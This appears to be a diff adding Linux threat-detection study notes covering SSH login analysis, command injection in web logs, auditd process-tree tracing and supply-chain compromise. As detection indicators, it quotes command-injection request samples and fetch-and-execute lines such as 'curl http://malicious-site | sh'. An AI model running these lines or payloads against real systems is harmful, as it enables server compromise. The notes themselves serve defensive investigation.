@@ -14656,3 +14656,270 @@ key                     → Audit rule identifier
 
 execve                  → Process execution system call
 ```
+
+# Linux Threat Detection 1
+
+## Initial Access via SSH
+
+SSH is a common way attackers gain access to Linux servers, especially when **password authentication** is exposed to the Internet.
+
+### Common SSH Attack Methods
+
+- **Stolen SSH keys** — Private keys may be stolen from source code, servers, or infected admin systems.
+- **Brute force** — Attackers repeatedly guess weak passwords.
+- **Vulnerable SSH server** — Attackers exploit vulnerabilities in the SSH service.
+- **Session hijacking** — Attackers take over an existing SSH session.
+
+---
+
+## Detecting SSH Attacks
+
+Check successful SSH logins:
+
+```bash
+grep -E 'Accepted' /var/log/auth.log
+```
+
+Check failed and successful logins:
+
+```bash
+grep "sshd" /var/log/auth.log | grep -E 'Accepted|Failed'
+```
+
+### Red Flags
+
+Look for:
+
+- Password-based login from an unexpected external IP
+- Many failed logins before a successful login
+- Login at unusual hours
+- Unexpected username
+- Suspicious source IP
+- Successful login after brute force attempts
+
+### Investigate
+
+For a suspicious login, check:
+
+1. **Username** — Is the user expected to log in?
+2. **Source IP** — Is the IP trusted?
+3. **Login history** — Were there previous failed attempts?
+4. **Activity after login** — What did the user do?
+
+---
+
+# Initial Access via Public Services
+
+Linux servers commonly expose services such as:
+
+- Web servers
+- Email servers
+- Databases
+- VPNs
+- Docker APIs
+
+A vulnerable or misconfigured public service can provide **Initial Access**.
+
+MITRE ATT&CK:
+
+```text
+T1190 — Exploit Public-Facing Application
+```
+
+### Application Logs
+
+Use application-specific logs to investigate attacks:
+
+| Service | Useful Logs |
+|---|---|
+| Web server | Access/error logs |
+| Database | Query logs |
+| VPN | Authentication logs |
+| Email | Mail logs |
+
+Application logs may not directly say that an exploit occurred, but they can provide useful evidence.
+
+---
+
+# Web Application Attacks
+
+A vulnerable web application can allow attackers to execute OS commands.
+
+Example suspicious requests:
+
+```text
+GET /ping?host=whoami
+GET /ping?host=;whoami
+GET /ping?host=;ls
+```
+
+These may indicate **command injection**.
+
+### What to Look For
+
+- Commands inside URL parameters
+- Unexpected commands such as `whoami`, `ls`, `id`
+- Repeated suspicious requests from the same IP
+- HTTP errors followed by successful command execution
+
+---
+
+# Process Tree Analysis
+
+Process trees help determine **how a suspicious command was executed**.
+
+Example:
+
+```text
+python3 app.py
+└── /bin/sh -c whoami
+    └── whoami
+```
+
+This tells us that the web application launched the command.
+
+### Auditd Investigation
+
+Find a suspicious command:
+
+```bash
+ausearch -i -x whoami
+```
+
+Find its parent:
+
+```bash
+ausearch -i --pid <PPID>
+```
+
+Continue tracing the parent processes until you reach the original application or user.
+
+### What to Look For
+
+A web server or application spawning commands such as:
+
+```text
+whoami
+ls
+id
+curl
+wget
+bash
+sh
+```
+
+can indicate that the application has been compromised.
+
+Especially suspicious:
+
+```text
+curl http://malicious-site | sh
+```
+
+---
+
+# Advanced Initial Access
+
+## Human-Led Attacks
+
+Linux servers can also be compromised when administrators or developers run untrusted commands.
+
+Examples:
+
+```bash
+curl https://example.com/script.sh | bash
+```
+
+or installing a malicious package because of a typo:
+
+```bash
+pip install <malicious-package>
+```
+
+### Detection
+
+Look for:
+
+- Commands downloading and immediately executing scripts
+- Unknown packages being installed
+- Unexpected processes after package installation
+- Connections to suspicious domains
+
+---
+
+# Supply Chain Compromise
+
+A **Supply Chain Compromise** occurs when attackers compromise software or a dependency and distribute the malicious code to its users.
+
+Examples include:
+
+- Malicious software updates
+- Compromised libraries
+- Malicious packages
+
+### Detection
+
+Look for:
+
+- Unexpected package updates
+- New or modified dependencies
+- Suspicious processes after software installation
+- Unexpected outbound connections
+
+---
+
+# Quick SOC Cheat Sheet
+
+```text
+SSH logs:
+  /var/log/auth.log
+
+Successful SSH:
+  Accepted
+
+Failed SSH:
+  Failed password
+
+SSH red flags:
+  External IP
+  Unusual login time
+  Password authentication
+  Brute force → successful login
+  Unexpected user
+
+Public service attack:
+  T1190 — Exploit Public-Facing Application
+
+Web attack indicators:
+  Suspicious URL parameters
+  whoami
+  id
+  ls
+  curl
+  wget
+
+Process investigation:
+  ausearch -i -x <command>
+  ausearch -i --pid <PID>
+
+Process tree:
+  Suspicious command
+      ↓
+  Parent process
+      ↓
+  Application/user
+      ↓
+  PID 1
+
+High-risk parent processes:
+  Web server → shell → command
+  Application → shell → command
+
+Human-led attacks:
+  curl | bash
+  Untrusted scripts
+  Malicious packages
+
+Supply chain:
+  Compromised software/dependency
+```
